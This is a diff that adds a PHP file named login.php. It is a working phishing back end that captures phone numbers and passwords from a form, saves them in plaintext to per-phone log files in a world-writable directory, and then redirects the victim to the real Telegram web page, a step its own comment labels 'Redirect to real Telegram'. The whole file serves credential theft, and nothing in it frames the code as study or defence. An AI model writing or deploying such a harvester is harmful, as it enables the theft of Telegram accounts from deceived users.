@@ -1,0 +1,28 @@
+<?php
+// login.php
+
+// Check if form is submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+ // Sanitize inputs
+ $phone = htmlspecialchars($_POST['phone']);
+ $password = htmlspecialchars($_POST['password']);
+
+ if (!empty($phone) && !empty($password)) {
+ // Create a log file named after the phone number
+ $filename = "logs/". preg_replace('/[^a-zA-Z0-9]/', '', $phone). ".txt";
+ 
+ // Ensure logs directory exists
+ if (!file_exists("logs")) {
+ mkdir("logs", 0777, true);
+ }
+
+ // Save credentials
+ $data = "Phone: ". $phone. "\nPassword: ". $password. "\nDate: ". date("Y-m-d H:i:s"). "\n";
+ file_put_contents($filename, $data);
+
+ // Redirect to real Telegram
+ header("Location: https://web.telegram.org");
+ exit;
+ }
+}
+?>
